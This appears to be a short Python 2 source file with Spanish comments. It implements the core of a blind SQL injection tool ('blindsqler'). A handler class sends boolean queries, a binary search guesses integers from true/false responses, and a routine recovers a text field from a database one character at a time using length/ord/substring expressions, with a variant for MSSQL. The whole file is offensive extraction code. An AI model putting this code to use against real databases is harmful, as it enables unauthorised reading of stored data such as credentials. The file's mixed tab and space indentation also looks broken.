#!/usr/bin/env python
#-*- coding: utf8 -*-

class QueryHandler(object):
	def __init__(self, field):
		""" Si vamos a usar adivinastr es necesario que la clase tenga un 
		atributo field que indique el campo cuyo valor se desea 
		averiguar """
		self.field = field
	def query(self, data):
		""" Retorna True si la consulta devuelve resultados, sino False
		data es la expresión generada por blindsqler"""
		pass

def adivinaint(handler, rango):
	""" Intenta adivinar el valor de un entero mayor perteneciente a
	range(*rango). Handler debe ser una instancia de QueryHandler """
	diferencia = 4 # hacemos un bucle tipo do..while
	while diferencia > 3:
		diferencia = rango[1] - rango[0]
		medio = rango[0] + diferencia/2
		print medio,
		if handler.query('<=%s'%medio):
			# n <= medio
			rango[1] = medio
			print rango
		else:
			# n > medio
			rango[0] = medio + 1
			print rango
	for i in range(rango[0],rango[1]+1):
		print i
		if handler.query('=%s'%i):
			return i
	raise ValueError


def adivinastr(handler, length = 256, mssql = False):
		""" Adivina el valor del campo de texto dado en handler.field.
		length indica la longitud máxima de la cadena. Su valor cambia
		posterioirmente por la longitud real. Si el servidor está corre
		Microsoft SQL Server mssql debe ser True."""
		# Primero calculamos la longitud
		field = handler.field
		if not mssql:
		    handler.field = 'length(%s)' % field
		else:
		    handler.field = 'len(%s)' % field
		length = adivinaint(handler,[0,length])

		# Adivinamos caracter por caracter
		result = ''
		for i in range(1, length + 1):
		    	if not mssql:
			    handler.field = 'ord(substring(%s,%s,1))' %(field,i)
			else:
			    handler.field='ascii(substring(%s,%s,1))' %(field,i)
			char = chr(adivinaint(handler,[0,255]))
			result += char

		return result


